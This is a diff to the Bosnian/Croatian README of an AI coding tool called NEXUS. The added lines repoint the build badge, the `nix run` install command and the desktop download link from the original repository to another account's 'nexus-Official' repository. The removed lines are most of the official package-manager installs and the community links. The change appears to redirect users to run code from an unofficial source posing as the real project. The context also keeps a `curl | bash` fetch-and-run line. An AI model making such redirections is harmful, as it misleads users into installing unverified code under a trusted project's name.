@@ -11,7 +11,7 @@
 <p align="center">
   <a href="https://nexus.ai/discord"><img alt="Discord" src="https://img.shields.io/discord/1391832426048651334?style=flat-square&label=discord" /></a>
   <a href="https://www.npmjs.com/package/nexus-ai"><img alt="npm" src="https://img.shields.io/npm/v/nexus-ai?style=flat-square" /></a>
-  <a href="https://github.com/anomalyco/nexus/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/nexus/publish.yml?style=flat-square&branch=dev" /></a>
+  <a href="https://github.com/ravipacharpro-jpg/nexus-Official/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/ravipacharpro-jpg/nexus-Official/publish.yml?style=flat-square&branch=dev" /></a>
 </p>
 
 <p align="center">
@@ -51,14 +51,9 @@ curl -fsSL https://nexus.ai/install | bash
 
 # Package manageri
 npm i -g nexus-ai@latest        # ili bun/pnpm/yarn
-scoop install nexus             # Windows
-choco install nexus             # Windows
-brew install anomalyco/tap/nexus # macOS i Linux (preporučeno, uvijek ažurno)
-brew install nexus              # macOS i Linux (zvanična brew formula, rjeđe se ažurira)
-sudo pacman -S nexus            # Arch Linux (Stable)
 paru -S nexus-bin               # Arch Linux (Latest from AUR)
 mise use -g nexus               # Bilo koji OS
-nix run nixpkgs#nexus           # ili github:anomalyco/nexus za najnoviji dev branch
+nix run github:ravipacharpro-jpg/nexus-Official           # ili github:ravipacharpro-jpg/nexus-Official za najnoviji dev branch
 ```
 
 > [!TIP]
@@ -66,18 +61,16 @@ nix run nixpkgs#nexus           # ili github:anomalyco/nexus za najnoviji dev br
 
 ### Desktop aplikacija (BETA)
 
-NEXUS je dostupan i kao desktop aplikacija. Preuzmi je direktno sa [stranice izdanja](https://github.com/anomalyco/nexus/releases) ili sa [nexus.ai/download](https://nexus.ai/download).
+NEXUS je dostupan i kao desktop aplikacija. Preuzmi je direktno sa [stranice izdanja](https://github.com/ravipacharpro-jpg/nexus-Official/releases) ili sa [nexus.ai/download](https://nexus.ai/download).
 
 | Platforma             | Preuzimanje                        |
 | --------------------- | ---------------------------------- |
 | macOS (Apple Silicon) | `nexus-desktop-mac-arm64.dmg`   |
 | macOS (Intel)         | `nexus-desktop-mac-x64.dmg`     |
-| Windows               | `nexus-desktop-windows-x64.exe` |
+| Windows               | `nexus-desktop-win-x64.exe` |
 | Linux                 | `.deb`, `.rpm`, ili AppImage       |
 
 ```bash
-# macOS (Homebrew)
-brew install --cask nexus-desktop
 # Windows (Scoop)
 scoop bucket add extras; scoop install extras/nexus-desktop
 ```
@@ -126,4 +119,3 @@ Ako radiš na projektu koji je povezan s NEXUS-om i koristi "nexus" kao dio nazi
 
 ---
 
-**Pridruži se našoj zajednici** [Discord](https://discord.gg/nexus) | [X.com](https://x.com/nexus)
